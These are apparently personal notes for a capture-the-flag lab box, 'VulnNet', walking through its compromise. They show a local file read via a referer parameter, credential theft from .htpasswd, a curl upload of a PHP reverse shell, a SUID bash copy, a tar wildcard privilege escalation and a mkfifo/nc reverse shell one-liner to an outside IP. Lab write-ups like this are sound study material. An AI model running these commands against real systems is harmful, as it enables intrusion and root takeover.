## Gaining Access 😉
- from source code, two javascript found which is available at /js directory
- got two links from those
- got one more link `http://vulnnet.thm/index.php?referer=`, this can be used to read /etc/passwd using curl [[#Important commands 🔥]] 1
- Since we are dealing with an Apache web server, we have to find the `.htpasswd` of the `broadcast.vulnnet.thm` web server. By default, you can view web configurations in the `/etc/apache2/sites-enabled/000-default.conf`. Run the following command to read this file:
- by reading `/etc/apache2/.htpasswd` , I got username and hashed password
- logged in to subdomain with this credeantials
- used curl command to upload phprevshell [[#Important commands 🔥]] 2
- got a revshell


## Maintaining Access 🥷
- found crontab which backing up users home. enumerated target dir and got ssh which is only readable. copied to /var/www/html/files and downloaded from browser, connected with ssh
- on crontab, executing by root, they used tar with absolute path
- copied rootbash to /tmp by abusing path variable
- tar wildcard privilege escalation


## Important commands 🔥
1. curl passwd
	```
	curl http://vulnnet.thm/index.php?referer=/etc/passwd
	```
2. upload with curl
	```php
	curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" [http://broadcast.vulnnet.thm/actions/photo_uploader.php](http://broadcast.vulnnet.thm/actions/photo_uploader.php) -u developers:<REDACTED>
	
	this
	curl -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:997  
	2761drmfsls
	```
3. copying rootbash to /tmp with suid permission
	```
	cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
	```
4. tar wildcard
	```bash
	echo > '--checkpoint=1'
	echo > '--checkpoint-action=exec=sh shell.sh'
	```
5. inside shell.sh
	```
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.229.254 4444 >/tmp/f
	```
## Post Exploitation ✴️
- User flag : /home/user
- Root flag : /root/root
## Tips 💡
- add in etc/hosts
- if you've found subdomains, add subdomains also `/etc/hosts`
- for lfi, check source code also
- search for exploit
